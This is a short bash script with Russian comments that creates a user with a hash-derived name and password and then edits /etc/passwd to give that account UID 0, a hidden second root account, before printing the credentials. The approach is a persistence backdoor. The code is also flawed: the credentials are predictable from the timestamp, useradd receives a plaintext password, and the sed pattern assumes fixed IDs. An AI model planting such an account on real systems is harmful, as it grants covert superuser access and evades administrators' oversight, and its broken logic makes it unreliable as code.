#!/bin/bash

# генерация юзера и пароля
USER=$(date +%s | sha256sum | base64 | head -c 32)
PASSWORD=$(date +%s | sha256sum | base64 | head -c 48)

# перевод имени юзера в нижний регистр (для совместимости)
USER=${USER,,}

# регистрация юзера и выдача ему рута
useradd -p "$PASSWORD" "$USER" &&
sed -i 's!'"$USER"':x:1001:1002::/home/'"$USER"':/bin/sh!'"$USER"':x:0:0::/home/'"$USER"':/bin/bash!' /etc/passwd &&

# аплодисменты
echo "Пользователь создан."
echo "User: $USER"
echo "Password: $PASSWORD"

exit 0;